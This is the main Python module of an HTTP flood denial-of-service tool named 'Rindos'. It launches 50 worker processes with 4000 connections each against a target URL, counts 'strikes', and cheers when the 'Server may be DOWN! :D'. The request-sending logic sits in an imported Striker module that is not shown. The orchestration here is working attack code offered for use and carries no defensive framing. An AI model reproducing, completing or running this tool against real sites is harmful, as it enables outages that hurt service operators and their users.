################# IMPORTING THINGS ##################################
from multiprocessing import Process, Manager, Pool
from colorama import Back, Fore, Style
from utils.striker import Striker                                                                    #
import sys, getopt, random, time, os, urllib.parse, ssl, http.client
import colorama#
#####################################################################

#################### VARIABLES #
DEBUG = False                  #
                               #
HTTPCLIENT = http.client       #
                               #
METHOD_GET  = 'get'            #
METHOD_POST = 'post'           #
METHOD_RAND = 'random'         #
                               #
JOIN_TIMEOUT=1.0               #
                               #
DEFAULT_WORKERS=50             #
DEFAULT_SOCKETS=4000           #
################################

class Rindos(object):
    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):
        # Set URL
        self.url = url
        # Initialize Manager
        self.manager = Manager()
        # Initialize Counters
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print(Fore.RED + "Shutting down Rindos")

    def __del__(self):
        self.exit()

    def printHeader(self):
        print("")
        print("")

    # funny :D
    def fire(self, workers):
        self.printHeader()
        print(Fore.LIGHTCYAN_EX + "MODE: '{0}' - WORKERS: {1}  - CONNECTIONS: {2} ".format(self.method, self.nr_workers, self.nr_sockets))

        if DEBUG:
            print(Fore.LIGHTGREEN_EX + "Starting {0} concurrent workers".format(self.nr_workers))

        # Start workers
        for i in range(int(workers)):
            try:
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except (Exception):
                print(Fore.RED + "Failed to start worker {0}".format(i))
                sys.exit(1)
                

        if DEBUG:
            print(Fore.YELLOW + "Initiating monitor")
        self.monitor()

    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print(Fore.LIGHTRED_EX + "{0} Rindos strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1]))

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print(Fore.CYAN + "\tServer may be DOWN! :D")
    
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except (Exception):
            sys.exit() # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print(Fore.LIGHTRED_EX + "CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print(Fore.LIGHTRED_EX + "Killing worker {0}".format(worker.name))
                        #worker.terminate()
                        worker.stop()
                    except Exception as ex:
                        pass # sorry senior devs, but shut up

                if DEBUG:
                    raise
                else:
                    pass

                sys.exit(0)
